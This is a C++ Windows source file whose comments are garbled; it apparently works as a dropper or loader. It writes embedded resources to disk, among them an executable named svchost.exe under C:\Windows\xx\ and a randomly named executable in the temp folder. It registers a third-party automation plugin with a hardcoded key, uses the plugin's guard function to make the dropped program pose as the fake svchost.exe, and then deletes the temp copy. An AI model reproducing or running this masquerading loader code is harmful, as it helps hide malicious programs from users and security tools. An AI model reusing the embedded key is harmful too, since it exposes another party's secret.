// start.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "resource.h"
#include "obj.h"
#include <Windows.h>
#define BUF_SIZE 4096
dmsoft * g_dm = NULL;
typedef int(__stdcall *lpSetDllPathA)(const char *, int);
struct ShareData
{
	char szDm[MAX_PATH];
	char szReg[MAX_PATH];
	char szRoot[MAX_PATH];
	char DmPath[MAX_PATH];
	char RegPath[MAX_PATH];
};
BOOL ReleaseRes(LPCSTR dir, LPCSTR strFileName, WORD wResID, LPCSTR strFileType)
{
	// ��Դ��С
	DWORD        dwWrite = 0;
	TCHAR tmpPath[_MAX_PATH];
	_tcscpy_s(tmpPath, _MAX_PATH, dir);
	_tcscat(tmpPath, strFileName);
	CreateDirectoryA(dir, NULL);
	// ������Դ�ļ��С�������Դ���ڴ桢�õ���Դ��С
	HRSRC        hResInfo = FindResource(NULL, MAKEINTRESOURCE(wResID), strFileType);
	if (hResInfo == NULL)
		return FALSE;
	HGLOBAL hResData = LoadResource(NULL, hResInfo);
	LPVOID pvResData = LockResource(hResData);
	DWORD        dwSize = SizeofResource(NULL, hResInfo);
	// �����ļ�
	HANDLE  hFile = CreateFile(tmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)//�����ļ�ʧ�� 
	{
		FreeResource(hResData);
		return FALSE;
	}

	// д���ļ�
	WriteFile(hFile, pvResData, dwSize, &dwWrite, NULL);
	CloseHandle(hFile);
	FreeResource(hResData);

	return TRUE;
}
int _tmain(int argc, _TCHAR* argv[])
{
	::CoInitialize(NULL);
	CString xx;
	char TempPath[_MAX_PATH];
	ShareData data;
	printf("\n\n���ڴ����Ժ�!!!");
	strcpy(data.szDm, "d_m.tmp");
	strcpy(data.szReg, "D_mReg.tmp");
	GetTempPathA(MAX_PATH, TempPath);
	ReleaseRes(TempPath, data.szDm, IDR_DM1, "DM");
	ReleaseRes(TempPath, data.szReg, IDR_DMREG1, "DMREG");
	ReleaseRes("C:\\Windows\\xx\\", "svchost.exe", IDR_XX1, "XX");

	sprintf(data.RegPath, "%s%s", TempPath, data.szReg);
	sprintf(data.DmPath, "%s%s", TempPath, data.szDm);
	// ���干������
	GetModuleFileName(NULL, data.szRoot, ARRAYSIZE(data.szRoot));
	PathRemoveFileSpec(data.szRoot);
	ReleaseRes(TempPath, "hgftykguyit111.exe", IDR_SVC1, "SVC");
	char tmpfile[MAX_PATH] = { 0 };
	sprintf(tmpfile, "%shgftykguyit111.exe", TempPath);
	// ���������ļ���� 
	HANDLE hMapFile = CreateFileMapping(
		INVALID_HANDLE_VALUE,   // �����ļ����
		NULL,   // Ĭ�ϰ�ȫ����
		PAGE_READWRITE,   // �ɶ���д
		0,   // ��λ�ļ���С
		BUF_SIZE,   // ��λ�ļ���С
		"ShareMemorySZHC"   // �����ڴ�����
		);

	// ӳ�仺������ͼ , �õ�ָ�����ڴ��ָ��
	LPVOID lpBase = MapViewOfFile(
		hMapFile,            // �����ڴ�ľ��
		FILE_MAP_ALL_ACCESS, // �ɶ�д���
		0,
		0,
		BUF_SIZE
		);

	// �����ݿ����������ڴ�
	memcpy(lpBase, &data, sizeof(data));

	HINSTANCE hDll = LoadLibrary(data.RegPath);
	lpSetDllPathA SetDllPathA;
	int ret;
	if (hDll != NULL)
	{
		SetDllPathA = (lpSetDllPathA)GetProcAddress(hDll, "SetDllPathA");
		if (SetDllPathA != NULL)
		{
			ret = SetDllPathA(data.DmPath, 0);
		}
	}
	g_dm = new dmsoft;
	if (g_dm == NULL)
	{
		return 0;
	}

	//ע��
	long dm_ret = g_dm->Reg("85119423354f46264f83cbed0c04ceb108dbde915", "lj");
	if (dm_ret != 1)
	{
		delete g_dm;
		return 0;
	}

	
	xx.Format(_T("f2 <C:\\Windows\\xx\\svchost.exe> <%s>"), tmpfile);
	g_dm->DmGuard(1, xx.GetBuffer());
	HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, _T("MyShare"));
	// �̹߳���������̶߳�ȡ����
	WaitForSingleObject(hEvent, 15000);
	DeleteFileA(tmpfile);
	CloseHandle(hEvent);
	// ����ļ�ӳ��
	UnmapViewOfFile(lpBase);
	// �ر��ڴ�ӳ���ļ�������
	
	delete g_dm;
	::CoUninitialize();
	return 0;
}

